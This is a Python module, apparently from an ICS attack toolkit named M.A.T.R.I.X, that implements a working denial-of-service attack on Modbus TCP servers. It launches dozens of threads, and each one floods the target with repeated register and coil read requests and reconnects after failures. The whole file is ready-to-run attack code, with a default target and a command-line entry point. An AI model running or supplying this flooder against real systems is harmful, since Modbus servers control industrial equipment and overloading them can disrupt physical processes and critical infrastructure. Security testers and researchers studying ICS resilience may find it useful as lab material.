#!/usr/bin/env python3
"""
Modbus DoS Attack Module for M.A.T.R.I.X
This module implements a Denial of Service attack against Modbus servers
by creating multiple concurrent connections and flooding with requests.
"""
from pymodbus.client import ModbusTcpClient
import threading
import time
import logging

# Configure logging
logger = logging.getLogger(__name__)

class ModbusDoSAttacker:
    def __init__(self, host='localhost', port=502, thread_count=100):
        """
        Initialize the DoS attacker with target information
        
        Args:
            host (str): Target host IP or hostname
            port (int): Target port number
            thread_count (int): Number of threads to launch
        """
        self.host = host
        self.port = port
        self.thread_count = thread_count
        self.stop_event = None
        self.threads = []
    
    def flood_server(self, stop_event):
        """
        Continuously send requests to the target Modbus server
        
        Args:
            stop_event (threading.Event): Event to signal thread termination
        """
        try:
            client = ModbusTcpClient(self.host, port=self.port)
            client.connect()
            request_count = 0
            
            while not stop_event.is_set():
                try:
                    # Send a variety of requests to increase load
                    client.read_holding_registers(address=1, count=125)
                    client.read_coils(address=1, count=2000)
                    request_count += 2
                    
                    # Occasionally log progress
                    if request_count % 100 == 0:
                        logger.debug(f"Thread sent {request_count} requests")
                except:
                    # Reconnect if connection fails
                    try:
                        client.close()
                        client.connect()
                    except:
                        time.sleep(0.1)  # Avoid tight loops on connection failure
        except Exception as e:
            logger.debug(f"Flood thread error: {e}")
    
    def launch_attack(self):
        """
        Launch a DoS attack with multiple threads
        """
        logger.info(f"Starting DoS attack against {self.host}:{self.port} with {self.thread_count} threads")
        
        self.stop_event = threading.Event()
        self.threads = []
        
        # Create and start threads
        for i in range(self.thread_count):
            t = threading.Thread(target=self.flood_server, args=(self.stop_event,))
            t.daemon = True
            t.start()
            self.threads.append(t)
            
            # Log progress
            if (i + 1) % 10 == 0 or i == 0 or i == self.thread_count - 1:
                logger.info(f"Started {i+1}/{self.thread_count} attack threads")
        
        try:
            # Run the attack until interrupted
            logger.info(f"DoS attack running with {self.thread_count} threads. Press Ctrl+C to stop.")
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            self.stop_attack()
    
    def stop_attack(self):
        """
        Stop the DoS attack by terminating all threads
        """
        if self.stop_event:
            logger.info("Stopping DoS attack...")
            self.stop_event.set()
            
            # Wait for threads to terminate
            for t in self.threads:
                t.join(timeout=0.5)
            
            logger.info("DoS attack stopped")

if __name__ == "__main__":
    # Configure logging when run directly
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    
    # Example usage when run directly
    attacker = ModbusDoSAttacker(host="localhost", port=502, thread_count=50)
    attacker.launch_attack()